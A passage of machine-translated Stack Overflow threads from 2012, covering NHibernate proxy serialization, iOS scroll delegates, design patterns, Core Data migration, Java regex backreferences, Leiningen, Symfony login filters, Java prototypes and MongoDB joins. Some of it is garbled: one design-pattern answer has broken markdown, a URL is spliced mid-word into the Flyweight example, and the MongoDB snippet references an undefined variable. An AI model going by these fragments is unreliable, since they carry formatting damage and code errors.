      <column name="ID" sql-type="INTEGER"></column>
      <generator class="assigned"></generator>
    </id>
    <property name="Description" type="String">
      <column name="DESCRIPTION" sql-type="VARCHAR( 100 )"></column>
    </property>
    <many-to-one name="Master" fetch="select">
      <column name="MS_ID" sql-type="INTEGER"></column>
    </many-to-one>
  </class>
</hibernate-mapping> 
```

MasterEtt.hbm.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<hibernate-mapping xmlns="urn:nhibernate-mapping-2.2" namespace="SofPOC.Questions.SerializeSession.Entities" assembly="SofPOC.Net4.NH2.Spring13">
  <class name="MasterEtt" table="MASTER">
    <id name="Id" type="Int32">
      <column name="ID" sql-type="INTEGER"></column>
      <generator class="assigned"></generator>
    </id>
    <property name="Description" type="String">
      <column name="DESCRIPTION" sql-type="VARCHAR( 100 )"></column>
    </property>
  </class>
</hibernate-mapping> 
```

**问题：**

即使重新连接反序列化的“休眠会话”，我也会收到“延迟加载错误”。如何避免这种“延迟加载错误”而无需重新附加实体？

我正在使用：

*   Spring.Net 1.3.2
*   NHibernate 2.1.2
*   System.Data.SQLite 1.0.80.0

完整的源代码在这里：[Q11553780.7z](https://dl.dropbox.com/u/49510149/stackoverflow/dotnet/Q11553780.7z)

**笔记：**

*   在打开解决方案（“.\Src\SofPOC.2010.sln”）之前，运行“.\Dependencies\setup.bat”来加载依赖项。
*   有关依赖项的说明，请参阅“.\readme.txt”和“.\dependencies\readme.txt”。

**编辑：**

我发现问题的原因是在`NHibernate.Proxy.AbstractLazyInitializer`NHibernate 的类中。该字段`_session`标记为`[NonSerialized]`。这使得该字段不被序列化。因此它在反序列化后为空。

见代码：

```
namespace NHibernate.Proxy
{
    [Serializable]
    public abstract class AbstractLazyInitializer : ILazyInitializer
    {
        /// <summary>
        /// If this is returned by Invoke then the subclass needs to Invoke the
        /// method call against the object that is being proxied.
        /// </summary>
        protected static readonly object InvokeImplementation = new object();

        private object _target = null;
        private bool initialized;
        private object _id;
        [NonSerialized]
        private ISessionImplementor _session;
        ... 
```

**编辑2：**

问题的原因实际上是属性 [NonSerialized] 因为当我进行以下“破解”时，测试通过了。通过反射，我将“_session”的属性从“Private | NotSerialized”更改为“Private”。

黑客：

```
 protected override void OnSetUp()
    {
        //Hacking "_session"
        Type aliType = Type.GetType("NHibernate.Proxy.AbstractLazyInitializer, NHibernate");
        FieldInfo fiSession = aliType.GetField("_session", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance);
        FieldInfo fi_m_fieldAttributes =
            fiSession.GetType().GetField(
                "m_fieldAttributes", 
                System.Reflection.BindingFlags.NonPublic 
                    | System.Reflection.BindingFlags.Instance);
        // changing it from "Private | NotSerialized" to only "Private"
        fi_m_fieldAttributes.SetValue(fiSession, FieldAttributes.Private);

        base.OnSetUp();
    } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-25T17:28:10.877

据我所知，可以尝试三种选择：

1.  使用反射将 _session 字段设置为反序列化会话
2.  打开一个新会话并重新连接它们。这可能会很痛苦，但我认为如果 NHibernate 团队很难做某事，他们可能有充分的理由这样做。
3.  创建您自己的 ILazyInitializer。[ServerSide在这里](http://www.theserverside.com/news/1363571/Remote-Lazy-Loading-in-Hibernate)有一篇关于它的文章。我自己没试过。

如果您尝试 nr 1，请告诉我们它是否有效。我有兴趣看看会发生什么。理论上它应该工作。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-31T23:20:45.243

**这是我根据@Jeroen 的建议给出的答案：**

我选择了@Jeroen 给出的第三个建议：“创建你自己的 ILazyInitializer ...”（它有效）。示范：

以下是它的制作方式：

SerializeSessionTest.spring.config（“MySessionFactory”的更改）：

```
<object id="MySessionFactory" type="Spring.Data.NHibernate.LocalSessionFactoryObject, Spring.Data.NHibernate21">
  <property name="DbProvider" ref="DbProvider"/>
  <property name="MappingResources">
    <list>
      <value>assembly://SofPOC.Net4.NH2.Spring13/SofPOC.Questions.SerializeSession.Entities/MasterEtt.hbm.xml</value>
      <value>assembly://SofPOC.Net4.NH2.Spring13/SofPOC.Questions.SerializeSession.Entities/DetailEtt.hbm.xml</value>
    </list>
  </property>
  <property name="HibernateProperties">
    <dictionary>
      <!--<entry key="connection.provider" value="AcessaDados.NHibernate.Connection.SiefDriverConnectionProvider, AcessaDados"/>-->
      <entry key="dialect" value="NHibernate.Dialect.SQLiteDialect"/>
      <entry key="connection.driver_class" value="NHibernate.Driver.SQLite20Driver"/>
      <entry key="current_session_context_class" value="Spring.Data.NHibernate.SpringSessionContext, Spring.Data.NHibernate21"/>

      <entry key="hbm2ddl.keywords" value="none"/>
      <entry key="query.startup_check" value="false"/>
      <entry key="show_sql" value="true"/>
      <entry key="format_sql" value="true"/>
      <entry key="use_outer_join" value="true"/>
      <entry key="bytecode.provider" value="SofPOC.Questions.SerializeSession.Spring.Data.NHibernate.Bytecode.BytecodeProviderSrlzSupport, SofPOC.Net4.NH2.Spring13"/>
      <entry key="proxyfactory.factory_class" value="SofPOC.Questions.SerializeSession.Spring.Data.NHibernate.Bytecode.ProxyFactoryFactorySrlzSupport, SofPOC.Net4.NH2.Spring13"/>
    </dictionary>
  </property>
</object> 
```

LazyInitializerSrlzSupport.cs（这里制作了支持 ISessionImplementor 序列化的 ILazyInitializer 实现）：

```
/// <summary>
/// Here was made ILazyInitializer implementation that supports the ISessionImplementor serialization.
/// </summary>
[Serializable]
public class LazyInitializerSrlzSupport : 
    global::Spring.Data.NHibernate.Bytecode.LazyInitializer,
    global::NHibernate.Proxy.ILazyInitializer, 
    AopAlliance.Intercept.IMethodInterceptor
{
    private static readonly MethodInfo exceptionInternalPreserveStackTrace;

    static LazyInitializerSrlzSupport()
    {
        exceptionInternalPreserveStackTrace = typeof(Exception).GetMethod("InternalPreserveStackTrace", BindingFlags.Instance | BindingFlags.NonPublic);
    }

    /// <summary>
    /// TODO:
    /// </summary>
    /// <param name="entityName"></param>
    /// <param name="persistentClass"></param>
    /// <param name="id"></param>
    /// <param name="getIdentifierMethod"></param>
    /// <param name="setIdentifierMethod"></param>
    /// <param name="componentIdType"></param>
    /// <param name="session"></param>
    public LazyInitializerSrlzSupport(
        string entityName, 
        Type persistentClass, 
        object id, 
        MethodInfo getIdentifierMethod, 
        MethodInfo setIdentifierMethod, 
        IAbstractComponentType componentIdType, 
        ISessionImplementor session)
        :base(entityName, 
            persistentClass, 
            id, 
            getIdentifierMethod, 
            setIdentifierMethod, 
            componentIdType, 
            session)
    {
        this._sessionSrlzSupport = session;
    }

    /// <summary>
    /// This must be the trick. This will be serialized so that 
    /// we can load the session in the "dynamic proxy".
    /// </summary>
    private ISessionImplementor _sessionSrlzSupport;

    #region ILazyInitializer Members
    public new void Initialize()
    {
        if (this.Session == null)
        {
            this.Session = this._sessionSrlzSupport;
        }
        base.Initialize();
    }

    public new object GetImplementation()
    {
        this.Initialize();
        return base.Target;
    }

    #endregion

    #region IMethodInterceptor Members

    object IMethodInterceptor.Invoke(IMethodInvocation invocation)
    {
        try
        {
            MethodInfo methodInfo = invocation.Method;
            object returnValue = base.Invoke(methodInfo, invocation.Arguments, invocation.Proxy);

            if (returnValue != InvokeImplementation)
            {
                return returnValue;
            }

            SafeMethod method = new SafeMethod(methodInfo);
            return method.Invoke(this.GetImplementation(), invocation.Arguments);
        }
        catch (TargetInvocationException ex)
        {
            exceptionInternalPreserveStackTrace.Invoke(ex.InnerException, new Object[] { });
            throw ex.InnerException;
        }
    }

    #endregion
} 
```

BytecodeProviderSrlzSupport.cs：

```
/// <summary>
/// TODO:
/// </summary>
public class BytecodeProviderSrlzSupport : 
    global::Spring.Data.NHibernate.Bytecode.BytecodeProvider,
    global::NHibernate.Bytecode.IBytecodeProvider
{
    private IProxyFactoryFactory proxyFactoryFactory;
    /// <summary>
    /// TODO:
    /// </summary>
    /// <param name="listableObjectFactory"></param>
    public BytecodeProviderSrlzSupport(IListableObjectFactory listableObjectFactory)
        : base(listableObjectFactory)
    {
        this.proxyFactoryFactory = new ProxyFactoryFactorySrlzSupport();
    }

    #region IBytecodeProvider Members

    IProxyFactoryFactory IBytecodeProvider.ProxyFactoryFactory
    {
        get { return this.proxyFactoryFactory; }
    }

    #endregion
} 
```

ProxyFactoryFactorySrlzSupport.cs：

```
/// <summary>
/// TODO:
/// </summary>
public class ProxyFactoryFactorySrlzSupport : 
    global::NHibernate.Bytecode.IProxyFactoryFactory
{
    #region IProxyFactoryFactory Members

    /// <summary>
    /// Build a proxy factory specifically for handling runtime lazy loading. 
    /// </summary>
    /// <returns>The lazy-load proxy factory.</returns>
    public IProxyFactory BuildProxyFactory()
    {
        return new ProxyFactorySrlzSupport();
    }

    ///<summary>
    ///</summary>
    public IProxyValidator ProxyValidator
    {
        get { return new DynProxyTypeValidator(); }
    }

    #endregion
} 
```

ProxyFactorySrlzSupport.cs：

```
/// <summary>
/// TODO:
/// </summary>
public class ProxyFactorySrlzSupport : 
    global::Spring.Data.NHibernate.Bytecode.ProxyFactory
{
    private static readonly ILog log = LogManager.GetLogger(typeof(ProxyFactorySrlzSupport));

    [Serializable]
    private class SerializableProxyFactory : global::Spring.Aop.Framework.ProxyFactory
    {
        // ensure proxy types are generated as Serializable
        public override bool IsSerializable
        {
            get { return true; }
        }
    }

    public override global::NHibernate.Proxy.INHibernateProxy GetProxy(object id, global::NHibernate.Engine.ISessionImplementor session)
    {
        try
        {
            // PersistentClass = PersistentClass.IsInterface ? typeof(object) : PersistentClass
            LazyInitializer initializer = new LazyInitializerSrlzSupport(EntityName, PersistentClass,
                                                  id, GetIdentifierMethod, SetIdentifierMethod, ComponentIdType, session);

            SerializableProxyFactory proxyFactory = new SerializableProxyFactory();
            proxyFactory.Interfaces = Interfaces;
            proxyFactory.TargetSource = initializer;
            proxyFactory.ProxyTargetType = IsClassProxy;
            proxyFactory.AddAdvice(initializer);

            object proxyInstance = proxyFactory.GetProxy();
            return (INHibernateProxy)proxyInstance;
        }
        catch (Exception ex)
        {
            log.Error("Creating a proxy instance failed", ex);
            throw new HibernateException("Creating a proxy instance failed", ex);
        }
    }
} 
```

完整的源代码在这里：[Q11553780.7z](https://dl.dropbox.com/u/49510149/stackoverflow/dotnet/Q11553780.7z)

# iphone - 让 tableView 继承自定义滚动视图委托

> ID：11553793
> 
> 赞同：0
> 
> 时间：2012-07-19T04:07:10.963
> 
> 标签：iphone, ios, uitableview, uiscrollview

我想做的是。

1.  覆盖 scrollView 的委托方法（例如，scrollViewDidEndDragging）
2.  将它用于我的 scrollView 和 tableView

我现在拥有的是，

1.  MyScrollView 的委托覆盖 scrollViewDidEndDragging
2.  MySuperTableViewController（UITableView 的子类）覆盖scrollViewDidEndDragging，并让MyChildTableViewController 子类化MySuperTableViewController

显然，相同的 scrollViewDidEndDragging 代码在两个地方重复，我如何将代码放在一个地方并共享它？

以下是我想为我的 scrollView 和 tableView 分享的代码

```
#import "OverlayTableViewController.h"

@interface OverlayTableViewController()
{
CADisplayLink *_displayLink;
}
@end

@implementation OverlayTableViewController

-(void)scrollViewWillBeginDragging:(UIScrollView*)scrollView
{
    [self startDisplayLinkIfNeeded];
}

- (void)scrollViewDidEndDragging:(UIScrollView*)scrollView willDecelerate:(BOOL)decelerate
{
    if(!decelerate)
        [self stopDisplayLink];
}

- (void)scrollViewDidEndDecelerating:(UIScrollView *)scrollView
{
    [self stopDisplayLink];
}

- (void)startDisplayLinkIfNeeded
{
    if(!_displayLink)
    {
        _displayLink = [CADisplayLink displayLinkWithTarget:self selector:@selector(display)];
        [_displayLink addToRunLoop:[NSRunLoop mainRunLoop] forMode:UITrackingRunLoopMode];
    }
}

- (void)stopDisplayLink
{
    [_displayLink invalidate];
    _displayLink = nil;
}

- (void)display
{
    //
}

@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T04:36:50.720

我认为最好的方法是将所有常见的委托逻辑放入新的东西中，称之为 CommonScrollViewDelegate。它可能需要一个像 displayLinkTarget 这样的属性以及使用它的类自定义的任何其他属性。

这些类中的任何一个都可以像这样设置它们的滚动委托：

```
CommonScrollViewDelegate *commonDelegate = [[CommonScrollViewDelegate alloc] init];

commonDelegate.displayLinkTarget = self; // or add this to the init method if you want
myScrollView.delegate = commonDelegate; 
```

然后，您在 CommonScrollViewDelegate 中的代码基本保持不变，只需进行如下微调：

```
@property(strong, nonatomic) id displayLinkTarget;
// etc.
@synthesize displayLinkTarget = _displayLinkTarget;

- (void)startDisplayLinkIfNeeded
{
    if(!_displayLink)
    {
        _displayLink = [CADisplayLink displayLinkWithTarget:self.displayLinkTarget
                                                   selector:@selector(display)];
        [_displayLink addToRunLoop:[NSRunLoop mainRunLoop] forMode:UITrackingRunLoopMode];
    }
} 
```

# design-patterns - 带有实时示例的设计模式

> ID：11553804
> 
> 赞同：6
> 
> 时间：2012-07-19T04:08:49.560
> 
> 标签：design-patterns

我想通过实时示例学习设计模式。任何人都可以建议我可以从哪里开始。

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2015-07-16T23:15:32.520

这些经典的设计模式每个开发者都应该了解，因为它帮助我们与其他开发者抽象层次的交流，让我们成为更好的设计师。

**注意：**添加带有真实生活和 Java API 示例的简短定义。

# 创造的

> 创建对象的方式。

**原型：**要复制或克隆的完全初始化实例
示例：国际象棋游戏的初始状态

*   `java.lang.Object#clone()`

**Builder** - 将复杂对象的构造与其表示分离，以便相同的构造过程可以创建不同的表示。
示例：当我们制作（或订购）披萨时（它的大小和口味可以不同）

*   java.lang.StringBuilder

**Singleton** - 一个只能存在一个实例的类
示例：一个国家的总统

*   java.lang.Runtime#getRuntime()

**工厂方法**- 创建一系列**对象**类型。
示例：在一个组织中，人力资源作为工厂方法工作。这里开发团队向 HR 请求资源类型。根据请求类型，HR 为开发团队提供资源。

*   java.util.Calendar#getInstance()

**Abstract Factory** - 创建几个类系列的
实例 示例：HP、Samsung 和 Dell 笔记本电脑使用 Intel 和 AMD 处理器。

*   javax.xml.parsers.DocumentBuilderFactory#newInstance()

[工厂方法与抽象工厂](https://stackoverflow.com/a/5740020/1697099)

# 结构

> 这种设计模式是关于类和对象组合的，即你想如何构建软件组件。这有助于我们保证当其中一个部件发生变化时，整个结构不需要改变。

**代理**- 代表另一个对象的对象。
示例：检查书页、信用卡、借记卡是 Money 和客户代表订购产品的代理。

*   java.rmi.*，实际上是整个 API。

**Composite** - 为叶子和复合物提供统一的接口。
示例：操作系统中的文件系统，目录是复合的，文件是叶子。系统调用`Open`是复合和叶子的单一接口。

**装饰器**- 为对象提供附加功能，同时提供统一的界面。
示例：1）在订单上添加**d** iscounts 2）枪本身就是一种致​​命的武器。但是你可以应用某些“装饰”来使它更准确、更安静和更具破坏性。

*   java.io.InputStream、OutputStream、Reader 和 Writer 的所有子类都有一个构造函数，该构造函数采用相同类型的实例。

**Facade** - 代表整个子系统的单个接口。
示例：控制面板、事件管理器。

*   javax.faces.context.ExternalContext，内部使用ServletContext、HttpSession、HttpServletRequest、HttpServletResponse等

**Adapter** - 为一个接口提供不同的接口。
示例：电源适配器

*   java.util.Arrays#asList()

**Flyweight** - 用于高效共享的细粒度实例
示例：*Flyweight 使用共享来支持大量对象高效 https://refactoring.guru/design-patternsly*。公共交换电话网络是享元的一个例子。有多种资源，例如拨号音发生器、振铃发生器和数字接收器，必须在所有用户之间共享。当用户拿起听筒拨打电话时，他或她不知道池中有多少资源。对订户而言，重要的是提供拨号音、接收数字并完成呼叫。

*   java.lang.Integer#valueOf(int) （也适用于布尔、字节、字符、短和长）

# 行为的

> 这种设计模式特别关注对象之间的通信。

**责任链**- 在对象链之间传递请求的一种方式
示例：贷款或休假审批流程，Java 中的异常处理。

*   javax.servlet.Filter#doFilter()

**迭代器**- 按顺序访问集合的元素
示例：电视上的下一个/上一个按钮

*   java.util.Iterator & java.util.Enumeration 的所有实现

**状态**- 当状态改变时改变对象的行为
示例：风扇墙控制

**观察者**- 一种通知更改多个类的方式
示例：投标或拍卖

*   发布/订阅 JMS API

**访问者**- 为类定义新操作，无需更改。示例：出租车

**模板**- 在操作中定义算法的骨架，并将一些步骤推迟到子类。
示例：蓝图

*   java.io.InputStream、java.io.OutputStream、java.io.Reader和java.io.Writer的所有非抽象方法。
*   java.util.AbstractList、java.util.AbstractSet 和 java.util.AbstractMap 的所有非抽象方法。
*   javax.servlet.http.HttpServlet，默认情况下所有的 doXXX() 方法都会向响应发送 HTTP 405“方法不允许”错误。您可以自由实施任何一个或任何一个。
*   Spring中的JMSTemplate HibernateTemplate和JdbcTemplate

**命令**- 将命令请求封装为对象
示例：餐厅的“客人检查”是命令模式的示例。服务员或女服务员接受客户的订单或命令，并通过将其写在支票上来封装该订单。然后将订单排队等待短期订单厨师。请注意，每个服务员使用的“检查”垫不依赖于菜单，因此他们可以支持烹饪许多不同项目的命令。

*   java.lang.Runnable 的所有实现

**Memento** - 捕获和恢复对象的内部状态
示例：在游戏中保存状态和在 Windows 中撤消/重做操作

*   java.io.Serializable 的所有实现

**调解器**- 定义类之间的简化通信
示例：空中交通管制员（ATC）

**策略**- 策略定义了一组可以互换使用的算法。
示例：运输方式

*   java.util.Comparator#compare()，由 Collections#sort() 等执行。
*   javax.servlet.http.HttpServlet、service() 和所有 doXXX() 方法采用 HttpServletRequest 和 HttpServletResponse 并且实现者必须处理它们（而不是将它们作为实例变量来获取！）。
*   javax.servlet.Filter#doFilter()

[Java实现的设计模式](https://stackoverflow.com/a/2707195/1697099)
[设计模式与简单的例子](https://refactoring.guru/design-patterns)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-19T04:13:24.960

我相信这是两个标准参考：

1.  [头部优先设计模式](http://shop.oreilly.com/product/9780596007126.do)
2.  [设计模式](https://rads.stackoverflow.com/amzn/click/com/0201633612)

据我所知，第一个更容易开始。

我为调查此问题所采取的步骤：

1.  谷歌“设计模式书籍”
2.  阅读[这个问题](https://stackoverflow.com/questions/105049/what-are-the-best-design-patterns-books-you-have-read)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-01-27T14:29:02.663

现在这是一个会吸引很多反对票的答案。但我会告诉它任何方式。

我的建议是，“不要学习设计模式！！！”

通过坚持设计模式，你限制了你的创造力。此外，一些设计模式也有不好的一面，他们不会告诉你。例如，如果不小心使用，单例模式可能会导致问题。

此外，IMO，一些著名的设计模式是在考虑一种语言的情况下创建的，以解决该语言的特定问题。然而，像 Python 和 Javascript 这样的进化语言可以在不拘泥于设计模式的情况下非常惊人地使用。

与其学习设计模式，不如学习编程范式和内部概念。我将从维基百科复制粘贴以下列表，

*   **允许副作用的**命令式，****
***   **不允许副作用的**功能性，*******   **声明性**的，它没有说明操作执行的顺序，*   **面向对象**，将代码与代码修改的状态组合在一起，*   **将代码分组为函数的**过程，*******   **具有特定风格的执行模型的**逻辑与特定风格的句法和语法相结合，以及*******   **具有特定语法和语法风格的**符号编程************

 ****当然，您可以通读标准设计模式以获得一些基本概念。但是不要从头到尾学习它们。它会破坏你的创造力。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-19T04:16:25.090

如果您正在寻找 C# 设计模式，请参考：

“C# 设计模式教程”——Jame W Cooper****

# ios - 在 iOS 中更改数据模型后无法运行

> ID：11553806
> 
> 赞同：0
> 
> 时间：2012-07-19T04:09:01.493
> 
> 标签：ios, core-data

我有一个运行良好的 iOS 应用程序。我对 CoreData 数据模型进行了更改，以将属性添加到现有表中。现在，它不会运行。它到达了我尝试使用 NSPredicate 查询的位置，并且没有错误地爆炸。

我已经删除了模拟器内的应用程序。我已经删除了 Xcode Organizer 中的“Derived Data”目录。我已经“清理”并重建了。我不确定我还能做些什么来“重置”应用程序。

我知道对数据模型进行更改可能会出现需要相对硬重置的问题，但我不知道如何继续。我所做的只是在工作数据模型中添加一个“Integer 16”列，但现在我的应用程序已经死了。

那么，关于如何解决这个问题的任何想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-19T20:54:27.833

发生此问题是因为用于保存数据库的托管对象模型的版本与新修改的模型不同。

您应该创建一个新版本的托管对象模型，然后配置 Core Data 以执行从以前的模型版本到最新版本的轻量级迁移。

请按照[文档中详细说明的步骤进行操作](http://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/CoreDataVersioning/Articles/vmLightweightMigration.html)。

# java - Java 正则表达式与反向引用的交集

> ID：11553811
> 
> 赞同：3
> 
> 时间：2012-07-19T04:09:23.330
> 
> 标签：java, regex

我正在尝试在 Java 中创建一个正则表达式来匹配特定单词的模式以查找具有相同模式的其他单词。例如，单词“tooth”具有模式 12213，因为 't' 和 'o' 都重复。我希望正则表达式匹配“牙齿”等其他词。

所以这是我使用反向引用的尝试。在此特定示例中，如果第二个字母与第一个字母相同，则它应该失败。此外，最后一个字母应该与其他字母不同。

```
String regex = "([a-z])([a-z&&[^\1]])\\2\\1([a-z&&[^\1\2]])";
Pattern p = Pattern.compile(regex);
Matcher m = p.matcher("tooth");

//This works as expected
assertTrue(m.matches());

m.reset("tooto");
//This should return false, but instead returns true
assertFalse(m.matches()); 
```

如果我删除最后一组，我已经验证它适用于像“嘟嘟”这样的例子，即以下，所以我知道反向引用正在工作到这一点：

```
String regex = ([a-z])([a-z&&[^\1]])\\2\\1"; 
```

但是，如果我将最后一组添加回模式的末尾，就好像它不再识别方括号内的反向引用。

我做错了什么，还是这是一个错误？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T05:13:46.740

**试试这个：**

```
(?i)\b(([a-z])(?!\2)([a-z])\3\2(?!\3)[a-z]+)\b 
```

**解释**

```
(?i)           # Match the remainder of the regex with the options: case insensitive (i)
\b             # Assert position at a word boundary
(              # Match the regular expression below and capture its match into backreference number 1
   (              # Match the regular expression below and capture its match into backreference number 2
      [a-z]          # Match a single character in the range between “a” and “z”
   )
   (?!            # Assert that it is impossible to match the regex below starting at this position (negative lookahead)
      \2             # Match the same text as most recently matched by capturing group number 2
   )
   (              # Match the regular expression below and capture its match into backreference number 3
      [a-z]          # Match a single character in the range between “a” and “z”
   )
   \3             # Match the same text as most recently matched by capturing group number 3
   \2             # Match the same text as most recently matched by capturing group number 2
   (?!            # Assert that it is impossible to match the regex below starting at this position (negative lookahead)
      \3             # Match the same text as most recently matched by capturing group number 3
   )
   [a-z]          # Match a single character in the range between “a” and “z”
      +              # Between one and unlimited times, as many times as possible, giving back as needed (greedy)
)
\b             # Assert position at a word boundary 
```

**代码**

```
try {
    Pattern regex = Pattern.compile("(?i)\\b(([a-z])(?!\\2)([a-z])\\3\\2(?!\\3)[a-z]+)\\b");
    Matcher regexMatcher = regex.matcher(subjectString);
    while (regexMatcher.find()) {
        for (int i = 1; i <= regexMatcher.groupCount(); i++) {
            // matched text: regexMatcher.group(i)
            // match start: regexMatcher.start(i)
            // match end: regexMatcher.end(i)
        }
    } 
} catch (PatternSyntaxException ex) {
    // Syntax error in the regular expression
} 
```

**看到它在[这里](http://fiddle.re/31fc)播放。希望这可以帮助。**

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-07-19T05:15:22.113

如果你打印你的正则表达式，你就会知道哪里出了问题，你的组中的反向引用实际上被 Java 转义以产生一些奇怪的字符。因此它不能按预期工作。例如：

```
m.reset("oooto");
System.out.println(m.matches()); 
```

也打印

> 真的

此外，`&&`在正则表达式中不起作用，您必须改用[前瞻](http://www.regular-expressions.info/lookaround.html)。此表达式适用于您上面的示例：

```
String regex = "([a-z])(?!\\1)([a-z])\\2\\1(?!(\\1|\\2))[a-z]"; 
```

表达式`(?!\\1)`向前看以查看下一个字符不是表达式中的第一个字符，而无需向前移动正则表达式光标。

# clojure - 在 Mac OS X 中安装 Leiningen 2.X

> ID：11553813
> 
> 赞同：3
> 
> 时间：2012-07-19T04:09:29.590
> 
> 标签：clojure, installation, leiningen

我正在使用 leiningen 版本 1.X，我正在尝试将其更新到版本 2.X。

正如[本网站](https://github.com/technomancy/leiningen/)所写，我将脚本下载为“lein2”，但是当我尝试运行“lein2”命令时，收到此错误消息。

```
Could not find artifact lein-newnew:lein-newnew:pom:0.3.4 in central (http://repo1.maven.org/maven2)
Could not transfer artifact lein-newnew:lein-newnew:pom:0.3.4 from/to clojars (https://clojars.org/repo/): Specified destination directory cannot be created: /Users/smcho/.m2/repository/lein-newnew/lein-newnew/0.3.4
Exception in thread "main" org.sonatype.aether.resolution.DependencyResolutionException: Failed to collect dependencies for [#<Dependency lein-newnew:lein-newnew:jar:0.3.4 (compile)>]
    at ...
    ... 4 more 
```

服务器似乎没有响应，但我不确定。可能有什么问题？我使用 Mac OS X 10.7.4。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T19:27:04.033

`~/.m2/repository`和目录是 root 拥有的`~/.m2/repository/org`，因此我无法访问在它下面创建子目录。更改所有权后，一切正常。我想我在兴奋 1.X 版本的 leiningen 时使用了 root 权限。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-11-20T22:23:09.433

brew 有一个 leiningen 的配方。

```
> brew update
> brew install leiningen
> lein -v
Leiningen 2.5.3 on Java 1.8.0_45 Java HotSpot(TM) 64-Bit Server VM 
```

# symfony1 - 为什么在不同服务器上部署 symfony 项目后登录不起作用？

> ID：11553814
> 
> 赞同：0
> 
> 时间：2012-07-19T04:09:41.380
> 
> 标签：symfony1, passwords, hosting

我有一个由其他开发人员使用 Symfony 框架开发的网站。我已经在我的一台托管服务器上成功配置了它。它工作正常。它应用了某种安全功能，以便在我们打开网站时要求登录。就像`.htpasswd`安全性一样，但在任何地方都没有找到该`.htpasswd`文件。

现在，我在另一个成功部署的专用服务器上使用相同的步骤部署了相同的站点，我什至可以打开后端，因为它不要求登录详细信息。但是当我打开前端时，它会询问登录详细信息。我输入了在以前的服务器上工作的相同登录详细信息，但由于某种原因它无法正常工作。

谁能建议我如何提供这种安全性？消除这种安全性的步骤应该是什么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T09:29:03.063

我解决了这个问题，它是由以前的开发人员创建的 Auth 过滤器。只是在 filters.yml 文件中禁用它。谢谢大家的帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-19T04:23:19.253

在 Symfony 1.x 中，您可以通过将 is_secure 选项设置为 false 来禁用登录，这可以在 config 文件夹中的 security.yml 文件中找到。

```
default:
  is_secure: true 
```

我不确定在这里删除密码保护是否正确。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-19T07:54:54.757

在`/etc/apache2/sites-enabled/`第一台服务器（一切正常的服务器）中，打开与您的网站相关的文件，并将其与服务器上不工作的同一文件进行比较。

您可能会找到一个名为`AuthUserFile`.

另外，向我们展示您`.htaccess`的身份验证位置。

# java - 是否可以在 Java 中模拟 Javascript 样式的原型？

> ID：11553815
> 
> 赞同：3
> 
> 时间：2012-07-19T04:09:58.810
> 
> 标签：java, javascript, prototype

我想知道是否可以在 Java 中模拟 Javascript 原型。是否可以将变量列表与 Java 中的函数相关联？如果可能的话，我想创建类似于 Javascript 原型的东西。

所以这里有一个例子（在 Javascript 中）：

```
 var s = doStuff.prototype;
s.isImplemented = false;
function doStuff(){
    //this function has not yet been implemented
}

var s = functionIsImplemented.prototype;
s.isImplemented = true;
function functionIsImplemented(theFunction){
    //this function returns true if the function has been identified as "implemented"
    if(theFunction.prototype.isImplemented == true){
        return true;
    }
    return false;
}
alert(functionIsImplemented(doStuff)); //this should print "false"
alert(functionIsImplemented(functionIsImplemented)); //this should print "true"​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 
```

有没有办法在 Java 中做到这一点？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-07-19T04:24:22.163

是的，这当然是可能的，并且在某些情况下非常有用。

通常，您会执行以下操作：

*   创建一个包含属性映射的类。这将成为您所有原型的“基础对象”类。K 可能是 String，V 可能是 Object
*   为您的属性创建 getter 和 setter
*   可选地添加其他实用程序方法，例如检查是否实现了函数基本上意味着检查属性映射是否包含特定键
*   通过克隆另一个对象的属性映射或（更复杂）保留对原始对象的引用来实现基于原型的继承
*   使用某种函数对象来允许在属性中存储任意代码

它不像您直接使用动态语言那样优雅，但它可以工作并为您带来相同的好处（运行时灵活性、避免严格的 OOP 约束、快速原型制作等）。

它也有同样的缺点——失去静态类型检查和一些性能开销是主要的。

例如，我编写的开源游戏 ( [Tyrant](http://sourceforge.net/projects/tyrant/) ) 对所有游戏内对象都使用了这种方法。

# javascript - mongodb - 一次链接多个文档

> ID：11553816
> 
> 赞同：0
> 
> 时间：2012-07-19T04:10:02.783
> 
> 标签：javascript, mongodb

我正在为帖子提供 JSON API，我想在将帖子对象链接到适当的用户模型后传递它。

我有一个这样的 MongoDB 模式：

```
User = {
    email: String,
    password: String
};

Post = {
    user: ObjectId,
    text: String
}; 
```

我没有发现链接单个帖子的问题，我使用以下代码完成了该操作（我使用的是 Mongoose 和 Express）：

```
app.get('/api/posts/:id', function(req, res){
  return Post.findById(req.params.id, function(err, post) {
    if (!err) {
        User.findById(post.user, function(err, user){

            var joinedpost = {
                text : post.text,
                user : user
            };
          return res.send(joinedpost);      
        });
     }
  });
}); 
```

但是，当我想为多个帖子提供服务时，我面临以下问题：由于我在异步环境中工作，我不能简单地获取所有帖子并遍历它们以将每个帖子链接到其用户。

所以我想我应该写两个查询，一个获取帖子，另一个同时链接它们，这样我就可以立即为它们提供服务。我对么？如果是这样，我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-19T05:15:00.367

`$in`操作员将允许您在一个查询中执行此操作。这是我的做法（假设你使用下划线）：

```
app.get('/api/posts', function(req, res){
  return Post.find(function(err, posts) {
    if (!err) {
      var userIds = _.pluck(posts, user);
      User.find({"id": {"$in": userIds}}, function(err, users){
        var map = {};
        _.each(users, function(u){
          map[u.id] = u;
        });
